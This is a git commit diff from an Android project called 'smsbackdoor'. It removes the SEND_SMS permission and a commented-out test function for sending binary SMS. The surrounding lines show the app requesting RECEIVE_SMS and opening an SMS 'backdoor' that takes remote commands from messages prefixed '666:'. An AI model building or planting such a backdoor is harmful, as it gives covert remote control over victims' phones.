4adda7607e65b22aff491b0393cf349097074c93
Chris Basinger <evilthreads669966@gmail.com>
2020-10-05 23:40:07 -0500

    remove SEND_SMS permission (#6)

--- app/src/main/java/com/evilthreads/smsbackdoor/MainActivity.kt
+++ app/src/main/java/com/evilthreads/smsbackdoor/MainActivity.kt
@@ -10,7 +10,7 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
-        KotlinPermissions.with(this).permissions(Manifest.permission.RECEIVE_SMS,Manifest.permission.SEND_SMS)
+        KotlinPermissions.with(this).permissions(Manifest.permission.RECEIVE_SMS)
             .onAccepted {
                 SmsBackdoor.openDoor(this, "666:"){ remoteCommand ->
                     when(remoteCommand){
@@ -22,13 +22,4 @@ class MainActivity : AppCompatActivity() {
                 }
             }.ask()
     }
-/*
-    *//*this is for testing by sending a binary sms message to ourself*//*
-    private fun sendCommand(destAddr: String, commandCode: String, command: String, port: Short){
-        val mgr = SmsManager.getDefault()
-        val parts = mgr.divideMessage(commandCode.plus(command))
-        parts.forEach {
-            mgr.sendDataMessage(destAddr, null, port.toShort(), command.toByteArray(), null, null)
-        }
-    }*/
 }
